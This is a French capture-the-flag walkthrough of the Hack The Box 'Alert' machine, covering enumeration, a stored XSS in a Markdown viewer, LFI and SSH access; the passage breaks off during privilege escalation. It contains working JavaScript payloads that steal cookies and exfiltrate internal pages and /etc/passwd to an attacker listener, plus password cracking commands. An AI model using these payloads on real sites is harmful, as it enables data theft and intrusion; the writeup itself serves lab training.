---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Alert — HTB Easy Writeup & Walkthrough"
linkTitle: "Alert"
slug: "alert"
date: 2026-04-06T09:00:00+01:00
#lastmod: 2026-03-21T09:36:20+01:00
draft: false

# --- PaperMod / navigation ---
type: "writeups"
summary: "Alert (HTB Easy) : XSS stockée, exfiltration JavaScript, LFI, récupération d’identifiants puis accès SSH et root."
description:  "Writeup complet de Alert (HTB Easy) : exploitation d’une XSS stockée, exfiltration JavaScript, LFI, récupération d’identifiants et escalade de privilèges jusqu’à root sur Linux."
tags: ["HTB Easy","Web","XSS","LFI","SSH","Apache"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Machine Alert HTB Easy exploitée via XSS stockée, LFI et escalade de privilèges jusqu’à root"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Alert"
  difficulty: "Easy"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Alert> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

La machine **Alert** de Hack The Box, classée **HTB Easy**, propose un scénario web réaliste basé sur l’exploitation d’un **Markdown Viewer vulnérable**, combiné à une gestion des accès côté serveur perfectible.

Dans ce challenge, tu vas exploiter une fonctionnalité d’upload pour injecter du JavaScript, puis l’utiliser pour accéder indirectement à des ressources internes de l’application.

Ce writeup te guide étape par étape depuis l’énumération initiale jusqu’à la compromission complète de la machine.

Tu y vois comment exploiter une **XSS stockée**, utiliser cette exécution JavaScript pour accéder à des ressources internes, récupérer des identifiants valides, obtenir un accès SSH, puis réaliser une **escalade de privilèges** jusqu’à **root**.

L’objectif est de comprendre comment une chaîne d’exploitation simple, mais bien construite, permet de compromettre entièrement une machine.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) permet d’identifier les ports ouverts suivants :

> Note : les IP et les timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée.

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:00 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.x.x)
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
12227/tcp filtered unknown

# Nmap done at Sat Mar 21 09:53:07 2026 -- 1 IP address (1 host up) scanned in 6.95 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :
- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Tu retrouves les résultats de cette énumération dans le fichier :

 `scans_nmap/enum_ftp_smb_scan.txt`

```bash
# mon-nmap — ENUM FTP / SMB
# Target : alert.htb
# Date   : 2026-03-21T09:53:07+01:00

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités.

Ce scan permet d’identifier rapidement les services à examiner en priorité.

Résultat (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour alert.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "alert.htb"

# Nmap 7.98 scan initiated Sat Mar 21 09:53:07 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt alert.htb
Nmap scan report for alert.htb (10.129.x.x)
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   58.01 ms 10.10.x.x
2   7.99 ms  alert.htb (10.129.x.x)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 21 09:53:22 2026 -- 1 IP address (1 host up) scanned in 14.36 seconds
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:22 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.x.x)
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
| http-headers: 
|   Date: Sat, 21 Mar 2026 08:53:30 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 3
|     /css/
|       css: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /css/
|   Total files found (by extension):
|_    Other: 1; css: 1; php: 3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 21 09:53:37 2026 -- 1 IP address (1 host up) scanned in 14.73 seconds
```



### Scan UDP rapide

Le script lance également un scan UDP rapide afin d’identifier d’éventuels services exposés (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:37 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.x.x)
Host is up (0.017s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

# Nmap done at Sat Mar 21 09:53:45 2026 -- 1 IP address (1 host up) scanned in 8.81 seconds
```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb alert.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier `RESULTS_SUMMARY.txt` te permet d’identifier rapidement les chemins découverts, sans parcourir l’ensemble des logs générés.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.1

Cible        : alert.htb
Périmètre    : /
Date début   : 2026-03-21 09:57:28

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://alert.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/alert.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://alert.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/alert.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/alert.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://alert.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/alert.htb/ffuf_files.json 2>&1 | tee scans_recoweb/alert.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://alert.htb/. (CODE:302|SIZE:660)
http://alert.htb/contact.php (CODE:200|SIZE:24)
http://alert.htb/css/
http://alert.htb/css/ (CODE:301|SIZE:304)
http://alert.htb/.htaccess.bak (CODE:403|SIZE:274)
http://alert.htb/.htaccess (CODE:403|SIZE:274)
http://alert.htb/.htc (CODE:403|SIZE:274)
http://alert.htb/.ht (CODE:403|SIZE:274)
http://alert.htb/.htgroup (CODE:403|SIZE:274)
http://alert.htb/.htm (CODE:403|SIZE:274)
http://alert.htb/.html (CODE:403|SIZE:274)
http://alert.htb/.htpasswd (CODE:403|SIZE:274)
http://alert.htb/.htpasswds (CODE:403|SIZE:274)
http://alert.htb/.htuser (CODE:403|SIZE:274)
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages/
http://alert.htb/messages/ (CODE:301|SIZE:309)
http://alert.htb/messages.php (CODE:200|SIZE:1)
http://alert.htb/.php (CODE:403|SIZE:274)
http://alert.htb/server-status (CODE:403|SIZE:274)
http://alert.htb/server-status/ (CODE:403|SIZE:274)
http://alert.htb/uploads/
http://alert.htb/uploads/ (CODE:301|SIZE:308)
http://alert.htb/wp-forum.phps (CODE:403|SIZE:274)

=== Détails par outil ===

[DIRB]
http://alert.htb/css/
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages/
http://alert.htb/server-status (CODE:403|SIZE:274)
http://alert.htb/uploads/

[FFUF — DIRECTORIES]
http://alert.htb/css/ (CODE:301|SIZE:304)
http://alert.htb/messages/ (CODE:301|SIZE:309)
http://alert.htb/server-status/ (CODE:403|SIZE:274)
http://alert.htb/uploads/ (CODE:301|SIZE:308)

[FFUF — FILES]
http://alert.htb/. (CODE:302|SIZE:660)
http://alert.htb/contact.php (CODE:200|SIZE:24)
http://alert.htb/.htaccess.bak (CODE:403|SIZE:274)
http://alert.htb/.htaccess (CODE:403|SIZE:274)
http://alert.htb/.htc (CODE:403|SIZE:274)
http://alert.htb/.ht (CODE:403|SIZE:274)
http://alert.htb/.htgroup (CODE:403|SIZE:274)
http://alert.htb/.htm (CODE:403|SIZE:274)
http://alert.htb/.html (CODE:403|SIZE:274)
http://alert.htb/.htpasswd (CODE:403|SIZE:274)
http://alert.htb/.htpasswds (CODE:403|SIZE:274)
http://alert.htb/.htuser (CODE:403|SIZE:274)
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages.php (CODE:200|SIZE:1)
http://alert.htb/.php (CODE:403|SIZE:274)
http://alert.htb/wp-forum.phps (CODE:403|SIZE:274)
```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
mon-subdomains alert.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```

Même si aucun vhost n’est identifié, ce fichier te permet de vérifier que le scan a bien été effectué et qu’aucun résultat supplémentaire n’a été trouvé.

```bash
=== mon-subdomains alert.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : 2026-03-21 09:58:24
Domaine      : alert.htb
IP           : 10.129.x.x
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 1
  - statistics.alert.htb

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=301 size=311 words=28 (Host=1ibj84efoa.alert.htb)
  Baseline#2: code=301 size=311 words=28 (Host=ehbl83zc3p.alert.htb)
  Baseline#3: code=301 size=311 words=28 (Host=2xr4e6jeq7.alert.htb)
  After-redirect#1: code=200 size=966 words=66
  After-redirect#2: code=200 size=966 words=66
  After-redirect#3: code=200 size=966 words=66
  VHOST (1)
    - statistics.alert.htb



=== mon-subdomains alert.htb END ===
```

## Prise pied

### Points d’entrée identifiés

À ce stade, l’énumération met en évidence un service web exposé sur le port 80, avec une application nommée **Markdown Viewer**.

Plusieurs chemins sont exposés, notamment `messages.php`, `contact.php` et le répertoire `/uploads/`.

Ces éléments confirment la présence d’une application web active.

Tu poursuis donc l’analyse côté web, en testant les fonctionnalités proposées par l’interface.

En accédant à `http://alert.htb`, tu arrives directement sur la page **“Markdown Viewer”**, qui constitue l’interface principale.



![Interface Markdown Viewer avec upload de fichier Markdown et bouton Browse sur alert.htb](markdown-viewer.png)

Sur cette page, un menu te permet de naviguer entre plusieurs sections :  
**Markdown Viewer**, **Contact us**, **About us** et **Donate**.

La section **Markdown Viewer** attire particulièrement l’attention, car la présence d’un bouton **“Browse”** suggère un mécanisme d’upload de fichiers Markdown.

### Test du rendu Markdown

Avant de chercher une vulnérabilité, tu commences par comprendre comment l’application traite les fichiers Markdown.

Pour cela, tu peux créer un fichier simple afin d’observer le comportement du rendu.

Par exemple, crée un fichier `test.md` avec le contenu suivant :

```markdown
# Test Markdown

Ceci est un test.
```

Ensuite :

1. Clique sur **“Browse”**
2. Sélectionne ton fichier `test.md`
3. Clique sur **“View Markdown”**

Le contenu est alors affiché dans l’interface.

![Affichage du fichier test.md dans Markdown Viewer après upload sur alert.htb](view-test-md.png)

> **Note :** un bouton **“Share Markdown”** est également présent sur la page et pourrait permettre de générer un lien de partage du contenu. Cette fonctionnalité sera analysée plus loin.

Tu confirmes ainsi que :

- les fichiers `.md` sont acceptés
- le contenu est correctement interprété et affiché

### Test de sécurité du rendu Markdown

Maintenant que tu contrôles le contenu affiché, l’étape suivante consiste à vérifier si ce contenu est correctement filtré.

Tu modifies ton fichier `test.md` en y ajoutant un script :

```markdown
# Test XSS

<script>alert(1)</script>
```

Après upload et affichage, une alerte JavaScript apparaît.

![Alerte JavaScript déclenchée par une faille XSS dans Markdown Viewer sur alert.htb](xss-alert.png)

Le code JavaScript est donc exécuté directement dans le navigateur.

Tu confirmes ainsi que le contenu Markdown n’est pas filtré et que les balises `<script>` sont interprétées.

Tu es donc face à une **XSS stockée**, puisque le contenu est enregistré puis exécuté lors de l’affichage.

### Test d’exfiltration via XSS

L’objectif est maintenant d’exploiter cette XSS pour récupérer des données.

Tu modifies ton fichier avec le payload suivant :

```markdown
# Alert Test

Ceci est un test Markdown.

<script>
new Image().src="http://10.10.x.x:8000/?c="+document.cookie;
</script>
```

Tu lances un serveur HTTP sur ta machine :

```bash
python3 -m http.server 8000
```

Puis tu charges à nouveau ton fichier Markdown.

Après chargement du Markdown, une requête apparaît dans ton terminal.

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.x.x - - [27/Mar/2026 10:44:40] "GET /?c= HTTP/1.1" 200 -
```

Tu confirmes ainsi que le navigateur peut envoyer des données vers ta machine.

Même si aucun cookie n’est récupéré ici, ce test valide le mécanisme d’exfiltration.



### Passage au contexte administrateur

Sur la page **About Us**, il est indiqué que les messages sont consultés par un administrateur.

![Page About Us indiquant que l’administrateur consulte les messages sur alert.htb](about-us.png)

Tu peux donc utiliser ce mécanisme pour faire exécuter ton payload XSS dans son navigateur.

Tu crées un message contenant ton payload, récupères le lien via `Share Markdown`, puis l’envoies via la page **Contact Us**.

![Formulaire Contact Us utilisé pour envoyer à l’administrateur le lien Markdown contenant le payload XSS sur alert.htb](contact-us.png)

Lorsque l’administrateur ouvre ce lien, le JavaScript s’exécute dans son contexte.



### Exfiltration de contenu avec JavaScript

Parmi les pages identifiées lors de l’énumération, `messages.php` est liée au système de messagerie de l’application.

Tu peux donc tenter d’en exfiltrer le contenu via la XSS.

Le principe est le suivant :

- envoyer une requête vers une page interne accessible par l’admin
- récupérer son contenu
- renvoyer ces données vers ta machine

Un premier test consiste à cibler la page suivante :

```txt
http://alert.htb/messages.php
```

Payload utilisé :

```html
<script>
fetch('http://alert.htb/messages.php')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'http://10.10.x.x:8000/?d=' + btoa(data);
  });
</script>
```

**Explication**

- `fetch()` envoie une requête HTTP vers la ressource cible
- la réponse est récupérée sous forme de texte avec `r.text()`
- `btoa()` encode les données en base64 pour faciliter leur transmission
- `new Image().src` permet d’envoyer ces données vers ton serveur

Ce code est exécuté dans le navigateur de l’administrateur.
 Il récupère le contenu de `messages.php`, puis l’exfiltre vers ta machine.



### Analyse du contenu récupéré

Lorsque l’administrateur ouvre ton lien, une requête contenant des données encodées en base64 apparaît dans ton listener :

```bash
10.129.x.x - - [date] "GET /?d=PGgxPk1lc3NhZ2VzPC9oMT48dWw+PGxpPjxhIGhyZWY9J21lc3NhZ2VzLnBocD9maWxlPTIwMjQtMDMtMTBfMTUtNDgtMzQudHh0Jz4yMDI0LTAzLTEwXzE1LTQ4LTM0LnR4dDwvYT48L2xpPjwvdWw+Cg== HTTP/1.1" 200 -
```

Tu peux décoder ce contenu avec :

```bash
echo "..." | base64 -d
```

Tu obtiens alors :

```html
<h1>Messages</h1>
<ul>
  <li>
    <a href='messages.php?file=2024-03-10_15-48-34.txt'>
      2024-03-10_15-48-34.txt
    </a>
  </li>
</ul>
```

Ce résultat montre que :

- la page liste des fichiers
- un paramètre `file` est utilisé pour charger leur contenu

Tu identifies alors le point d’entrée suivant :

```bash
messages.php?file=...
```

**Conclusion**

Tu es face à un vecteur potentiel de **Local File Inclusion (LFI)**.

Si ce paramètre n’est pas correctement sécurisé, il pourrait permettre de lire des fichiers arbitraires sur le serveur.

Tu testes donc cette hypothèse dans la suite de l’exploitation.



### Exploitation de la LFI

Tu utilises le paramètre identifié pour tenter une lecture de fichier.

Un test classique consiste à cibler `/etc/passwd` avec un chemin relatif :

```
../../../../etc/passwd
```

Payload :

```html
<script>
fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'http://10.10.x.x:8000/?d=' + btoa(data);
  });
</script>
```

Après exécution par l’administrateur, tu récupères après décodage :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

Le paramètre `file` permet donc de lire des fichiers arbitraires sur le serveur.

L’application est vulnérable à une **Local File Inclusion (LFI)**.

Tu peux désormais accéder à des fichiers sensibles et poursuivre l’exploitation.

### Exploitation des fichiers de configuration

Grâce à la LFI, tu peux lire des fichiers système et de configuration.

Un bon réflexe consiste à analyser la configuration Apache.

Tu commences par :

/etc/apache2/apache2.conf

Tu identifies la directive :

```bash
IncludeOptional sites-enabled/*.conf
```

Tu poursuis avec :

```bash
/etc/apache2/sites-enabled/000-default.conf
```

Une ligne attire ton attention :

```bash
AuthUserFile /var/www/statistics.alert.htb/.htpasswd
```

Tu récupères ce fichier via la LFI :

```txt
/var/www/statistics.alert.htb/.htpasswd
```

Résultat :

```bash
albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/
```

Tu identifies un hash Apache (MD5) pour l’utilisateur `albert`.

Tu places le hash dans un fichier :

```bash
echo '$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/' > hash.txt
```

Puis tu lances `hashcat` :

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

Mot de passe obtenu :

```txt
manchesterunited
```

Tu récupères donc les identifiants :

**albert:manchesterunited**



### Test des identifiants

Ces identifiants proviennent d’un `.htpasswd`, mais en CTF ils fonctionnent souvent sur d’autres services, notamment SSH.

Tu les testes donc en SSH :

```bash
ssh albert@alert.htb
```

L’authentification fonctionne.

Tu obtiens ainsi un accès SSH en tant qu’utilisateur `albert`.

### Récupération du flag

Une fois connecté en SSH, vérifie ton contexte :

```bash
id
uid=1000(albert) gid=1000(albert) groups=1000(albert),1001(management)
```

> L’utilisateur appartient au groupe `management`, ce qui pourrait être utile pour la suite.

Tu listes les fichiers :

```bash
ls -l
-rw-r----- 1 root albert 33 Mar 29 13:19 user.txt
```

Puis tu récupères le flag :

```bash
cat user.txt
7e4dxxxxxxxxxxxxxxxxxxxxxxxxxxx31fb
```



### Conclusion de la prise de pied

Tu as obtenu :

- une exécution JavaScript dans le navigateur de l’administrateur
- un accès aux fichiers du serveur via une LFI
- un mécanisme d’exfiltration fiable vers ta machine

Ces éléments t’ont permis de récupérer des identifiants, puis d’obtenir un accès SSH en tant que `albert`.

Tu récupères ensuite le flag `user.txt`, ce qui valide la prise de pied.

La prise de pied est donc terminée avec succès. Tu peux maintenant passer à la phase suivante : l’escalade de privilèges.

---

## Escalade de privilèges

{{< escalade-intro user="albert" >}}

### Sudo -l

```bash
Sorry, user albert may not run sudo on alert.
```

Aucune commande sudo exploitable. Tu poursuis l’énumération.



### Recherche de binaires SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Résultat (extrait)**

```bash
/opt/google/chrome/chrome-sandbox
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Il s’agit uniquement de binaires système standards. Aucun binaire exploitable ici.



### Analyse des Linux capabilities

```bash
getcap -r / 2>/dev/null
```

**Résultat**

```bash
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Ces capabilities sont liées au réseau et ne permettent pas d’obtenir une élévation de privilèges.



### Inspection des tâches cron

```bash
cat /etc/crontab
```

**Résultat**

```bash
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Aucune tâche exploitable.



### Choix du répertoire de travail

Les répertoires `/tmp` et `/dev/shm` sont régulièrement nettoyés sur cette machine, un comportement courant en CTF.

Pour éviter la suppression de tes fichiers (scripts, outils, payloads), tu dois utiliser un répertoire :

\- accessible en lecture et en écriture par l’utilisateur `albert`
\- non soumis à un mécanisme de nettoyage

Tu identifies les répertoires accessibles avec :

```bash
find / -type d -writable 2>/dev/null
```

Le répertoire `/var/tmp` répond à ces critères.

Contrairement à `/tmp` et `/dev/shm`, il n’est pas nettoyé automatiquement et permet de conserver les fichiers.

**Tu utilises donc `/var/tmp` comme répertoire de travail pour la suite.**

### Analyse automatisée des SUID avec suid3num.py

Pour compléter la recherche manuelle, tu utilises `suid3num.py`, qui permet d’identifier rapidement les binaires SUID potentiellement exploitables.

Tu le télécharges et l’exécutes depuis `/var/tmp` :

```bash
cd /var/tmp
wget http://10.10.x.x:8000/suid3num.py
python3 suid3num.py
```

**Résultat (extrait)**

```bash
[!] Default Binaries (Don't bother)
/opt/google/chrome/chrome-sandbox
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

[~] Custom SUID Binaries (Interesting Stuff)
------------------------------

[#] SUID Binaries found in GTFO bins..
[!] None :(
```

Aucun binaire SUID exploitable n’est identifié. Tu poursuis l’énumération.



### Accès au sous-domaine `statistics.alert.htb`

Après avoir ajouté le sous-domaine dans `/etc/hosts`, tu peux y accéder depuis ta machine :

```
http://statistics.alert.htb
```

Une **page de login** est affichée.

Tu testes alors les identifiants récupérés lors de la prise de pied, ce qui te permet d’accéder à un **dashboard de statistiques de donations**.

![Dashboard statistics.alert.htb affichant les donations et les top donateurs](statistics.alert.htb.dashboard.png)

Le dashboard est accessible, mais **n’offre aucune possibilité d’exploitation**.

Cette piste peut donc être écartée et tu poursuis ton énumération.



### Analyse des services locaux

```bash
netstat -tulpn
```

**Résultat (extrait)**

```bash
tcp        0      0 127.0.0.1:8080          LISTEN
tcp        0      0 0.0.0.0:22              LISTEN
tcp6       0      0 :::80                   LISTEN
```

Un service est accessible uniquement en local sur le port `127.0.0.1:8080`.

Pour y accéder, tu mets en place un tunnel SSH :

```bash
ssh -L 8888:127.0.0.1:8080 albert@alert.htb
```

Puis tu ouvres dans ton navigateur :

```txt
http://localhost:8888
```

Tu arrives sur une interface **Website Monitor** :

